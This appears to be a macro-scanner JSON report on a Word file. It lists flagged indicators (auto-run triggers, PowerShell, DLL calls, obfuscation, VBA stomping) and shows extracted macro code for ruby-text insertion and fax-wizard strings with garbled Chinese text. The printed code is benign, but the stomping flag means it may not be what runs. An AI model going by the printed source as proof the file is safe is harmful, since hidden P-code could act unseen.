{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"UC01\"",
            "Attribute VB_Base = \"0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}\"",
            "Attribute VB_Creatable = True",
            "Attribute VB_PredeclaredId = False",
            "Attribute VB_Exposed = False",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = False",
            "Attribute VB_Name = \"UF01\"",
            "Attribute VB_Base = \"0{F4F72338-0478-11D3-89EB-00104B2921DE}{F4F72311-0478-11D3-89EB-00104B2921DE}\"",
            "Attribute VB_Creatable = False",
            "Attribute VB_PredeclaredId = True",
            "Attribute VB_Exposed = False",
            "Attribute VB_TemplateDerived = False",
            "Attribute VB_Customizable = False",
            "Attribute VB_Name = \"UM01\"",
            "Attribute VB_Name = \"NewMacros\""
        ],
        "behavior": {
            ".Variables": "May use Word Document Variables to store and hide data",
            "AutoClose": "Runs when the Word document is closed",
            "AutoExit": "Runs when the Word document is closed",
            "AutoNew": "Runs when a new Word document is created",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "Environ": "May read system environment variables",
            "FindWindow": "May enumerate application windows",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "RegCloseKey": "May read or write registry keys",
            "Run": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "Windows": "May enumerate application windows",
            "autoopen": "Runs when the Word document is opened",
            "btnBackup_Click": "Runs when the file is opened and ActiveX objects trigger events",
            "call": "May call a DLL using Excel 4 Macros",
            "command": "May run PowerShell commands",
            "put": "May write to a file"
        },
        "macro": "\n\n\n\n\n\n\n\nPrivate Const SZ_MACRONAME = \"\u00a8\u00c3\u00a6C\u00a4\u00e5\u00a6r\"\n\nSub Insert()\n    With Selection\n        If Len(.Text) = 1 And .Text = (Chr$(13)) Then\n            MsgBox \"\u00bd\u00d0\u00a5\u00fd\u00bf\u00ef\u00a8\u00fa\u00adn\u00a8\u00c3\u00a6C\u00aa\u00ba\u00a4\u00e5\u00a6r\u00a1A\u00a6A\u00bf\u00ef\u00a8\u00fa\u00a5\u00bb\u00a5\\\u00af\u00e0\u00bf\u00ef\u00b6\u00b5\u00a1C\",                     Title:=SZ_MACRONAME\n            GoTo LExit:\n        End If\n        If ((.Start = .End) And (.Text = Chr$(21))) Then\n            .MoveRight , 1, 1\n        End If\n        If (Right$(.Text, 1) = Chr$(13)) Then\n            .End = .End - 1\n        End If\n        If (FIsRubyField(.Range) = False) Then\n            If (.Range.Fields.Count > 0) Or (InStr(1, .Text, Chr$(13)) <> 0)                 Or (InStr(1, .Text, vbTab) <> 0) Or (InStr(1, .Text, \",\") <> 0)                 Or (InStr(1, .Text, \"(\") <> 0) Or (InStr(1, .Text, vbTab) <> 0) Then\n                MsgBox \"\u00b5L\u00aak\u00ac\u00b0\u00a7t\u00a6\u00b3\u00a9w\u00a6\u00ec\u00c2I\u00a1B\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00a9M\u00acq\u00b8\u00a8\u00b2\u00c5\u00b8\u00b9\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a5[\u00a4J\u00a8\u00c3\u00a6C\u00aa\u00ba\u00b5\u00f9\u00b8\u00d1\", Title:=SZ_MACRONAME\n                GoTo LExit:\n            End If\n        End If\n        If (Selection.Start = Selection.End) Then\n            MsgBox \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5[\u00a4J\u00b5\u00f9\u00b8\u00d1\u00aa\u00ba\u00a6r\u00a6\u00ea\", Title:=SZ_MACRONAME\n            GoTo LExit:\n        End If\n    End With\n    InitDialog\n    dlgRuby.Show\nLExit:\nEnd Sub\n\nSub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String)\n    Dim rgn As Range\n    Dim n As Integer\n    Dim iCurSize As Integer\n    Dim szCurFont As String\n    Dim fnt As Font\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n    \n    On Error GoTo LError\n    With Selection\n        Set rgn = .Range\n        Set fnt = GetCurFont(rgn)\n        If (FIsRubyField(rgn) = True) Then\n            Delete\n        End If\n\n        iCurSize = fnt.Size\n        szCurFont = fnt.Name\n        n = Len(.Text)\n        \n        ' Insert Field\n        .Fields.Add .Range, , , False\n        .TypeText \"eq \\o\"\n        \n        ' Ruby string align\n        Select Case (szAlign)\n        Case \"\u00bea\u00a5\u00aa\"\n            .TypeText \"\\al\"\n        Case \"\u00b5\u00a5\u00b6\u00a1\u00b6Z\u00aei\u00b6}\"\n            .TypeText \"\\ad\"\n        Case Else\n        End Select\n        \n        .TypeText \"(\\s\\up\" + Str$(Int(iDist + .Font.Size - 1)) + \"(\"\n        .InsertBefore szRuby\n        .Font.Size = iSize\n        .Font.Name = szFont\n        .Font.DisableCharacterSpaceGrid = False\n        .MoveRight\n        .InsertAfter \"),\"\n        .Font.Size = iCurSize\n        .Font.Name = szCurName\n        .MoveRight , n + 2\n        .TypeText \")\"\n        ' Kludge, To remove space char at end of field....\n        .MoveLeft , 2\n        .Delete unit:=wdCharacter, Count:=1\n        \n        .Fields.ToggleShowCodes\n        .MoveRight , 1, 1\n        \n    End With\nLExit:\n    Application.ScreenUpdating = True\n    System.Cursor = wdCursorNormal\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\nSub Delete()\n    Dim rgn As Range\n    Dim rgnFld As Range\n    Dim rgnNew As Range\n    Dim szCode As String\n    Dim FUpdate As Boolean\n    \n    On Error GoTo LError\n    If (Application.ScreenUpdating = True) Then\n        FUpdate = True\n        Application.ScreenUpdating = False\n        System.Cursor = wdCursorWait\n    Else\n        FUpdate = False\n    End If\n    \n    With Selection\n        Set rgn = .Range\n        If (.Fields.Count < 1) Then GoTo LExit:\n        For i = 1 To .Fields.Count\n            szCode = rgn.Fields(i).Code\n            Set rgnFld = rgn.Fields(i).Code\n            If (FIsRubyField(rgn) = False) Then\n                GoTo LExit:\n            End If\n            \n            iTop = InStr(1, szCode, \",\") + rgnFld.Start\n            iEnd = rgnFld.End - 1\n            rgnFld.SetRange iTop, iEnd\n            \n            .MoveLeft\n            Set rgnNew = Selection.Range\n            rgnNew.FormattedText = rgnFld.FormattedText\n            .MoveRight , Len(rgnFld.Text)\n            .MoveRight , 1, 1\n            .Delete\n            rgnNew.Select\n            \n        Next i\n    End With\nLExit:\n    If (FUpdate = True) Then\n        Application.ScreenUpdating = True\n        System.Cursor = wdCursorNormal\n    End If\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\nSub InitDialog()\n    Dim i As Integer\n    Dim n As Integer\n    Dim szFont As String\n    Dim szCode As String\n    Dim fnt As Font\n    Dim fntRuby As Font\n    \n    On Error GoTo LError:\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n\n    dlgRuby.IDCD_ALIGN.Clear\n    dlgRuby.IDCD_ALIGN.AddItem \"\u00bea\u00a5\u00aa\"\n    dlgRuby.IDCD_ALIGN.AddItem \"\u00b8m\u00a4\u00a4\"\n    dlgRuby.IDCD_ALIGN.AddItem \"\u00b5\u00a5\u00b6\u00a1\u00b6Z\u00aei\u00b6}\"\n    \n    With Selection\n        Set fnt = GetCurFont(.Range)\n        If (FIsRubyField(.Range) = True) Then\n            dlgRuby.ID_RESET.Enabled = True\n            ' Get Selected Field Values\n            ' { eq \\o\\ad(\\s\\up 12(foo),bar) }\n            Dim rgn As Range\n            .Fields(1).Select\n            Set rgn = .Fields(1).Code\n            szCode = .Fields(1).Code.Text\n            \n            ' { eq \\o\\ad(\\s\\up 12(foo),bar) }\n            '                     ~~~\n            iTop = InStr(11, szCode, \"(\")\n            iEnd = InStr(1, szCode, \",\") - 2\n            Set rgn = .Fields(1).Code\n            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd\n            Set fntRuby = GetCurFont(rgn)\n            dlgRuby.IDCT_FONT.Caption = fntRuby.NameFarEast\n            dlgRuby.IDCT_SIZE.Caption = fntRuby.Size\n            dlgRuby.IDCE_TEXT = rgn.Text\n            \n            ' { eq \\o\\ad(\\s\\up 12(foo),bar) }\n            '                  ~~\n            iTop = InStr(1, szCode, \"up \") + 2\n            iEnd = InStr(11, szCode, \"(\")\n            Set rgn = .Fields(1).Code\n            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd\n            dlgRuby.IDCE_DIST = Val(Mid$(szCode, iTop, iEnd - iTop)) - Int(fnt.Size) + 1\n            \n            ' { eq \\o\\ad(\\s\\up 12(foo),bar) }\n            '        ~~~\n            If (InStr(1, szCode, \"\\al\") > 0) Then\n                dlgRuby.IDCD_ALIGN.ListIndex = 0\n            ElseIf (InStr(1, szCode, \"\\ad\") > 0) Then\n                dlgRuby.IDCD_ALIGN.ListIndex = 2\n            Else\n                dlgRuby.IDCD_ALIGN.ListIndex = 1\n            End If\n        Else\n            dlgRuby.ID_RESET.Enabled = False\n            dlgRuby.IDCE_TEXT = \"\"\n            dlgRuby.IDCE_DIST = Str$(0)\n            dlgRuby.IDCT_SIZE.Caption = Int(fnt.Size / 2)\n            dlgRuby.IDCT_FONT.Caption = fnt.NameFarEast\n            dlgRuby.IDCD_ALIGN.ListIndex = 1\n        End If\n        dlgRuby.IDCE_TEXT.IMEMode = fmIMEModeNoControl\n        dlgRuby.IDCE_TEXT.SetFocus\n        dlgRuby.IDCE_TEXT.SelStart = 0\n        dlgRuby.IDCE_TEXT.SelLength = 99\n        If (dlgRuby.IDCE_TEXT.Text <> \"\") Then\n            dlgRuby.IDOK.Enabled = True\n        Else\n            dlgRuby.IDOK.Enabled = False\n        End If\n    End With\n\n    Application.ScreenUpdating = True\n    System.Cursor = wdCursorNormal\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\nFunction FIsRubyField(rgn As Range) As Boolean\n    FIsRubyField = False\n    If (rgn.Fields.Count = 0) Then Exit Function\n    a$ = rgn.Fields(1).Code.Text\n    ' { eq \\o\\ad(\\s\\up 12(foo),bar) }\n    '   ~~~~~   ~~~~~~ and \"),\\s\\do\" is only contained Kumimoji field\n    If (Left$(a$, 6) = \" eq \\o\") And (InStr(6, a$, \"(\\s\\up\") <> 0) And (InStr(9, a$, \"),\\s\\do\") = 0)         And (Right$(a$, 1) = \")\") Then\n        FIsRubyField = True\n    End If\nEnd Function\n\n\nFunction BuildRedirString$()\n\nDim RedirString$\nDim Arg$(0 To 11)\nDim OS As String\n\nSelect Case System.OperatingSystem\nCase \"Windows\"\n  OS = \"Win\"\nCase \"Windows NT\"\n  OS = \"WinNT\"\nCase \"Macintosh\"\n  OS = \"Mac\"\nCase Else\n  OS = \"Win\"\nEnd Select\n\nRedirString$ = \"http://www.microsoft.com/isapi/redir.dll?\"\n\nArg$(0) = \"PRD=Word\"\nArg$(1) = \"&SBP=ia\"\nArg$(2) = \"&PLCID=\" & Application.International(wdProductLanguageID)\nArg$(3) = \"&PVER=\" & Application.Version\nArg$(4) = \"&OS=\" & OS\nArg$(5) = \"&OVER=\" & System.Version\nArg$(6) = \"&OLCID=\" 'intentionally left blank\nArg$(7) = \"&CLCID=\" & \"0x\" & System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Control Panel\\International\", \"Locale\")\nArg$(8) = \"&AR=templates\"\nArg$(9) = \"&O1=\"\nArg$(10) = \"&O2=\"\nArg$(11) = \"&O3=\"\n\n\nFor i = 0 To 11\n  RedirString$ = RedirString$ & Arg$(i)\nNext\n\nBuildRedirString$ = RedirString$\n\nEnd Function\n\nSub UpdateLink()\n    Dim Anchor As Range\n    For Each Hlink In ActiveDocument.Hyperlinks 'look at all hyperlinks in doc\n        If Hlink.Address = \"http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates\" Then 'look for address to change\n            If Hlink.Type = msoHyperlinkRange Then 'get Anchor - Text Or Shape\n                Set Anchor = Hlink.Range        'text anchor\n            Else\n                Set Anchor = Hlink.Shape        'shape anchor\n            End If\n            Hlink.Delete            'delete old link\n            ActiveDocument.Hyperlinks.Add Anchor, BuildRedirString()  'add new hlink in same place\n        End If\n    Next\nEnd Sub\n\nOption Explicit\n\n'Standard Claimer\n\n''******************************************************************************\n'TO BE LOCALIZED\n''******************************************************************************\n'Style names\nPublic Const strSTY_RETURN_ADDR     As String = \"Return Address\"\nPublic Const strSTY_DOC_LABEL       As String = \"Document Label\"\nPublic Const strSTY_COMPANY_NAME    As String = \"Company Name\"\nPublic Const strSTY_MSG_HDR_FIRST   As String = \"Message Header First\"\nPublic Const strSTY_MSG_HDR_LABEL   As String = \"Message Header Label\"\nPublic Const strSTY_MSG_HDR_LAST    As String = \"Message Header Last\"\n\n'misc strings\nPublic Const strPHONE   As String = \"\u00b9q\u00b8\u00dc\u00a1G\"\nPublic Const strFAX     As String = \"\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1G\"\nPublic Const strPAGES   As String = \"\u00c1`\u00ad\u00b6\u00bc\u00c6\u00a1G\"\nPublic Const strTO      As String = \"\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a1G\"\nPublic Const strFROM    As String = \"\u00b1H\u00a5\u00f3\u00aa\u00cc\u00a1G\"\nPublic Const strDATE    As String = \"\u00a4\u00e9\u00b4\u00c1\u00a1G\"\nPublic Const strRE      As String = \"\u00a5D\u00a6\u00ae\u00a1G\"\nPublic Const strCC      As String = \"\u00aa\u00fe\u00a5\u00bb\u00a1G\"\n\nPublic Const strCOMPANY         As String = \"\u00a4\u00bd\u00a5q\u00a6\u00e6\u00b8\u00b9\u00a1G\"\nPublic Const strFAX_NUMBER      As String = \"\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1G\"\nPublic Const strPHONE_NUMBER    As String = \"\u00b9q\u00b8\u00dc\u00a1G\"\nPublic Const strTOTAL_NO_PAGES  As String = \"\u00a5]\u00a7t\u00ab\u00ca\u00ad\u00b1\u00a6b\u00a4\u00ba\u00c1`\u00a6@\u00ad\u00b6\u00bc\u00c6\u00a1G\"\n\nPublic Const strEMPTY_MACRO As String = \"EmptyMacro \"\nPublic Const strNONE        As String = \"<None>\" 'choice to list of merge field\n                                                 'names found in data source\n                                'doc. if there is no field for last name.\n                                'if the user selected this choice we don't\n                                'insert a merge field for last name in the cover sheet.\nPublic Const strFLD_NAME As String = \"Name\" 'to select the field containing recipient name\n                                    'from the fields present in the data source\nPublic Const strFLD_FAX As String = \"Fax\" 'to select the merge field containing fax number\n\nPublic Const strCLICK_HERE_NAME     As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a9m\u00a6W]\"\nPublic Const strCLICK_HERE_PAGES    As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00ad\u00b6\u00bc\u00c6]\"\nPublic Const strCLICK_HERE_SUBJECT  As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00a5D\u00a6\u00ae]\"\nPublic Const strCLICK_HERE_COMMENTS As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a5\u00b2\u00adn\u00aa\u00ba\u00b5\u00f9\u00b0O]\"\nPublic Const strCLICK_HERE_COMPANY  As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a4\u00bd\u00a5q\u00a6W\u00ba\u00d9]\"\nPublic Const strCLICK_HERE_PHONE_NUMBER As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b9q\u00b8\u00dc]\"\nPublic Const strCLICK_HERE_FAX_NUMBER As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc]\"\n\n'Address format to get info. from the Address book. Please be careful about the commas and\n'spaces since you might end up with a space at the beginning of a name if not put at the right place.\n'Please change the names only if you know the correct one.\nPublic Const strADDR_BK_NAME_FORMAT As String = \"{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}\"\nPublic Const strADDR_BK_ADDR_FORMAT As String = \"{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>\" & vbCr & \"}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}\"\nPublic Const strADDR_BK_FAXNUM_FORMAT As String = \"{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}\"\nPublic Const strADDR_BK_PHONE_FORMAT As String = \"{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}\"\nPublic Const strADDR_BK_COMPANY_FORMAT As String = \"{<PR_COMPANY_NAME>}\"\n\n'status messages put up while faxing the cover sheet and document. For some messages\n'I add \"...\" and so add \"...\" to all strings.\nPublic Const strFAXING_DOC_RECIPIENTS As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc...\"\nPublic Const strFAXING_DOC_RECIPIENT As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00b5\u00b9\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\"\nPublic Const strFAXING_CS_RECIPIENTS As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc...\"\nPublic Const strFAXING_CS_RECIPIENT As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\"\nPublic Const strFAXING_CS_TO As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00a8\u00ec\"\nPublic Const strFAXING_DOC_TO As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a8\u00ec\"\n\n'the text in the last panel\n'the first one is the default. The next string is used if the user selects no cover sheet, when\n'we actually send the fax on clicking Finish\nPublic Const strLAST_PANEL_DFLT_TEXT As String = \"\u00a6p\u00aaG\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a6\u00b3\u00b0\u00dd\u00c3D\u00aa\u00ba\u00b8\u00dc\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00c0\u00cb\u00acd\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00aa\u00ba\u00ae\u00e6\u00a6\u00a1\u00acO\u00a7_\u00a5\u00bf\u00bdT\u00a1C\u00a8\u00d2\u00a6p\u00a1A\u00b1z\u00acO\u00a4\u00a3\u00acO\u00a7\u00d1\u00a4F\u00b6Q\u00a4\u00bd\u00a5q\u00aa\u00ba\u00b9q\u00b8\u00dc\u00a8t\u00b2\u00ce\u00a6b\u00bc\u00b7\u00a5~\u00bdu\u00abe\u00a1A\u00bb\u00dd\u00a5\u00fd\u00ab\u00f6\u00ad\u00d3\u00c1\u00e4\u00a1A\u00a4\u00f1\u00a6p\u00bb\u00a1\u00bc\u00c6\u00a6r\u00c1\u00e4\u00a1u9\u00a1v\u00a1C\u00adn\u00b0O\u00b1o\u00a5[\u00b6i\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a4\u00a4\u00b3\u00e1\u00a1I\"\nPublic Const strLAST_PANEL_NOCOVSHT_TEXT As String = \"\u00a9\u00d2\u00a6\u00b3\u00b8\u00ea\u00ae\u00c6\u00a4w\u00bf\u00e9\u00a4J\u00a7\u00b9\u00b2\u00a6\u00a1A\u00ab\u00f6\u00a4@\u00a4U\u00a7\u00b9\u00a6\u00a8\u00c1\u00e4\u00a1A\u00ba\u00eb\u00c6F\u00b1N\u00b0e\u00a5X\u00b1z\u00aa\u00ba\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a1I\"\n\n'strings necessary to display help in case of failure of Fax\nPublic Const strHLP_FAX_INSTALL As String = \"\u00a6p\u00aaG\u00b1z\u00b2{\u00a6b\u00b0\u00f5\u00a6\u00e6\u00aa\u00ba\u00acO Windows 95\u00a1A\u00b2{\u00a6b\u00b1z\u00b4N\u00a5i\u00a5H\u00a6w\u00b8\u00cb\u00a5\u00bb\u00ba\u00eb\u00c6F\u00a4F\u00a1C\u00ab\u00f6\u00a4U\u00bdT\u00a9w\u00c1\u00e4\u00a1A\u00bf\u00c3\u00b9\u00f5\u00a4W\u00b1N\u00b7|\u00a5X\u00b2{\u00bb\u00b2\u00a7U\u00bb\u00a1\u00a9\u00fa\u00a4\u00e5\u00a5\u00f3\u00a1A\u00a7i\u00b6D\u00b1z\u00a6p\u00a6\u00f3\u00a6w\u00b8\u00cb\u00ba\u00eb\u00c6F\u00a1I\"\n'the next string is the title as it appears on Word's main window\nPublic Const strMS_WORD As String = \"Microsoft Word\"\n\n'make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off\n'when the command bar is displayed.\nPublic Const strCMD_BAR_TITLE   As String = \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\nPublic Const strCMD_BTN_TEXT    As String = \"\u00b2{\u00a6b\u00b0e\u00a5X\u00b6\u00c7\u00afu\"\n\nPublic Const strCURRENT_DOC     As String = \"\u00a5\u00d8\u00abe\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3(\"\nPublic Const strRIGHT_PAREN     As String = \")\"\n\n'Window caption of the cover sheet (the document's name will follow if the user is faxing a document)\nPublic Const strWINDOW_CAPTION  As String = \"\u00aa\u00ba\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\"\n'Window caption if user is not faxing a doc. and just created a cover sheet.\nPublic Const strCOVER_SHEET_CAPTION As String = \" - \u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\"\n\n'Text in merge fields inserted in the cover sheet\nPublic Const strFLD_FAX_NAME    As String = \"Name\"\nPublic Const strFLD_FAX_NUMBER  As String = \"FaxNumber\"\n\n'In NT3.51, the printer name from the print set up dialog which is called when the user clicks on\n'Other... , returns the printer name with the printer location after ON\n'so if a printer name is \\\\abcd\\efg with location \"location1\" then the printer\n'name is returned a \"\\\\abcd\\efg ON location1. So we have to strip out the text\n'after ON. That's what this constant is for. In other countries too is this text\n'going to be ON?\nPublic Const strPRINTER_ON      As String = \" ON \"\n\nPublic Const iMAX_ADDR_LINES = 3 'max. # of lines address can have\n'Error messages\nPublic Const strERR_MAX_ADDR_LINES  As String = \"\u00a6a\u00a7}\u00a4\u00a3\u00a5i\u00b6W\u00b9L\u00a4T\u00a6\u00e6\u00a1C\"\nPublic Const strERR_NO_DATA_SRC     As String = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00adn\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1C\"\nPublic Const strERR_CREATING_CMDBAR As String = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00ab\u00d8\u00a5\u00df\u00a1uSend Fax\u00a1v\u00a4u\u00a8\u00e3\u00a6C\u00a1C \u00bd\u00d0\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1C\"\nPublic Const strERR_NO_MAIN_DOC1     As String = \"\u00adn\u00ab\u00d8\u00a5\u00df\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3 (\"\nPublic Const strERR_NO_MAIN_DOC2     As String = \") \u00a5\u00bc\u00b6}\u00b1\u00d2\u00a1C\u00bd\u00d0\u00a5\u00fd\u00b6}\u00b1\u00d2\u00b8\u00d3\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b5M\u00ab\u00e1\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a1I\"\nPublic Const strERR_DISPLAY_QUERY_OPTIONS As String = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00adn\u00a5[\u00a4J\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1C\"\nPublic Const strERR_CHOOSING_DOC As String = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5\u00ce\u00a8\u00d3\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1C\"\nPublic Const strERR_RCPNTS_NOT_CHOSEN As String = \"\u00ba\u00eb\u00c6F\u00bb\u00dd\u00adn\u00aa\u00be\u00b9D\u00b3o\u00a5\u00f7\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00acO\u00bd\u00d6\u00a1C\u00bd\u00d0\u00ab\u00f6\u00a4U\u00a1u\u00bdT\u00a9w\u00a1v\u00b6s\u00a1A\u00b5M\u00ab\u00e1\u00bf\u00ef\u00a8\u00fa\u00b6\u00c7\u00afu\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a1C\"\n\n'this tip is displayed in an Autodown balloon finally\nPublic Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00a8\u00e4\u00a5\u00a6\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1A\u00b5M\u00ab\u00e1\u00ab\u00f6\u00a4U\u00a6b \" & strCMD_BAR_TITLE & \" \u00a4u\u00a5y\u00a6C\u00a4W\u00aa\u00ba\u00a1u\" & strCMD_BTN_TEXT & \"\u00a1v\u00b6s\u00a1C \"\n'this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients\nPublic Const strPOST_WIZARD_TIP_MRG_FLD As String = \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00a8\u00e4\u00a5\u00a6\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1A\u00b5M\u00ab\u00e1\u00ab\u00f6\u00a4U\u00a6b \" & strCMD_BAR_TITLE & \" \u00a4u\u00a5y\u00a6C\u00a4W\u00aa\u00ba\u00a1u\" & strCMD_BTN_TEXT & \"\u00a1v\u00b6s\u00a1C \" & \"\u00a6\u00fd\u00bd\u00d0\u00a4\u00a3\u00adn\u00a7R\u00b0\u00a3\u00a6b\u00a1u<< >>\u00a1v\u00b2\u00c5\u00b8\u00b9\u00a4\u00a4\u00aa\u00ba\u00c4\u00e6\u00a6\u00ec\u00a1F\u00b5y\u00ab\u00e1\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00b1N\u00a7Q\u00a5\u00ce\u00a5L\u00ad\u00cc\u00a8\u00d3\u00b6\u00c7\u00afu\u00b1z\u00ab\u00fc\u00a9w\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a8\u00ec\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a4\u00e2\u00a4W\u00a1C\"\n\n'this message is put up after we successfully faxed everything\nPublic Const strMSG_FAX_SUCCESS As String = \"\u00ba\u00eb\u00c6F\u00a4w\u00b1N\u00b1z\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00b0e\u00a5X\u00a5h\u00a4F\u00a1C\"\n\n'the 72 factor in the below 2 measurements is conversion factor of inches to points\n'contemporary styles have a left indent of 0.56\"\nPublic Const sCONT_LEFT_INDENT As Single = 0.56 * 72\n'While converting text to table, for the Contemporary style alone,\n'I need to set the first column's width explicitly. For English text,\n'0.5\" is big enough. If the text in the first column is getting truncated\n'in your language, then please increase this value.\nPublic Const sCONT_WIDTH_COL1 As Single = 2.36 * 72\n\n'The date format need not be localized if VB does not require it.\n'Medium date is of the format \"02-Apr-94\". If the standard date format\n'is anything different in the country, then please change it.\n'important to have MMMM and not mmmm, since mm refers to minutes in a time field\nPublic Const strDATE_FORMAT As String = \"MMMM d, yyyy\"\n\n''******************************************************************************\n'DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS\n''******************************************************************************\n'the following are the names of the autotext entries 